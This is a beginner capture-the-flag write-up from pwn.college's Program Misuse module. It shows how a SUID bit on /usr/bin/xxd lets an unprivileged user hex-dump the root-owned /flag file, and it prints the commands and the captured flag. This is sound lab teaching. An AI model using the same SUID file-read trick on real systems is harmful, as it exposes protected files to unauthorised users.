---
layout: page
title: "Challenge Name: xxd"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/xxd`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/xxd
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/xxd
```

-The `s` in `-rws` indicates it's a SUID binary.
-`xxd` runs with **root privileges**.

## 🚀 Exploitation

The `xxd`  is a powerful Linux command used to:

1.Create hex dumps of files (like hd or hexdump)

2.Revert hex dumps back to binary

3.View both hex values and ASCII side-by-side

This can easily reveal the contents of /flag.

```bash
xxd /flag
```

Output:
```
00000000: 7077 6e2e 636f 6c6c 6567 657b 6b48 624a  pwn.college{kHbJ
00000010: 3871 7a52 786f 4d53 6546 7762 6e49 3567  8qzRxoMSeFwbnI5g
00000020: 4f45 574d 3743 6f2e 6456 544e 7877 534d  OEWM7Co.dVTNxwSM
00000030: 3049 7a4d 7945 7a57 7d0a                 0IzMyEzW}.
```

      
